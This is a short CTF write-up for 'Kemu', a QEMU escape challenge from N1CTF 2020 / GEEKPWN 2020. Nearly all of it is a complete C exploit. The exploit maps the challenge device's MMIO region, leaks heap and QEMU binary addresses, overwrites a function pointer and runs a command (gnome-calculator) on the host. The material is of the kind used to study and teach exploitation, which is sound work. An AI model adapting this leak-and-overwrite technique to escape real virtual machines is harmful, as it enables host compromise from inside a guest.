# Kemu
**Funny QEMU Escape Challenge in N1CTF 2020 (&& GEEKPWN 2020)**

**I'm lucky to finish it with my friend [@luckyu](https://github.com/sh1ner) .**

## EXP
```
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>


unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}



void mmio_write(uint32_t addr, uint64_t value)
{
    *((uint64_t*)(mmio_mem + addr)) = value;
}


uint64_t mmio_read(uint32_t addr)
{
    return *((uint64_t*)(mmio_mem + addr));
}

void  set_flag(char flag){
    char magic=*(char *)(mmio_mem+0x800+1);
    *(char *)(mmio_mem) = flag;
}


int main(int argc, char *argv[])
{
    char *filename="/sys/devices/pci0000:00/0000:00:04.0/resource4\x00";

    int mmio_fd = open(filename, O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("[+] MMAP at %p\n", mmio_mem);

    set_flag(3);
    *(char *)(mmio_mem) = 0;
    set_flag(2);
    for(int i=0;i<=0x7f;i++){
        *(char *)(mmio_mem+0x800+0x80+i)='A';
    }
    set_flag(3);
    char address[8];
    for(int i=0;i<8;i++){
       address[i] = *(char *)(mmio_mem+0x800+8+i);
    }
    size_t heap_addr=*(size_t *)address;
    printf("[+] Heap address = 0x%llx\n",heap_addr);
    set_flag(1);
    for(int i=0;i<=0x7f;i++){
        *(char *)(mmio_mem+0x800+i)='B';
    }
    set_flag(2);
    *(char *)(mmio_mem) = 0x01;
    set_flag(3);
    char magic = *(char *)(mmio_mem);

    set_flag(3);
    for(int i=0;i<8;i++){
       address[i] = *(char *)(mmio_mem+0x800+0x190+i);
    }
    size_t elf_base=*(size_t *)address-0x4FA470;
    printf("[+] ELF Base address = 0x%llx\n",elf_base);

    char magic_func_addr[8];
    *(size_t *)magic_func_addr=elf_base+0x2a6bb0;
    magic_func_addr[6]=0x3;
    magic_func_addr[7]=0x3;

    set_flag(2);
    for(int i=0;i<0x79;i++){
        *(char *)(mmio_mem+0x800+0x80+6+i)='B';
    }
    *(char *)(mmio_mem+0x800+0x80+0x7f)='\x00';

    set_flag(3);
    magic = *(char *)(mmio_mem);

    set_flag(2);
    *(char *)(mmio_mem+0x800+0x80+0x7f)='A';

    set_flag(1);
    for(int i=0;i<8;i++){
        *(char *)(mmio_mem+0x800+i)=magic_func_addr[i];
    }
    set_flag(3);
    magic = *(char *)(mmio_mem);

    char *cmd="gnome-calculator\x00";
    set_flag(1);
    for(int i=0;i<strlen(cmd)+1;i++){
        *(char *)(mmio_mem+0x800+i)=cmd[i];
    }
    puts("[+] Escape Successfully");
    set_flag(3);
    magic = *(char *)(mmio_mem);
}
```
## Escape Successfully
![PWN](https://upload-images.jianshu.io/upload_images/7434375-dd608bc828f9384a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

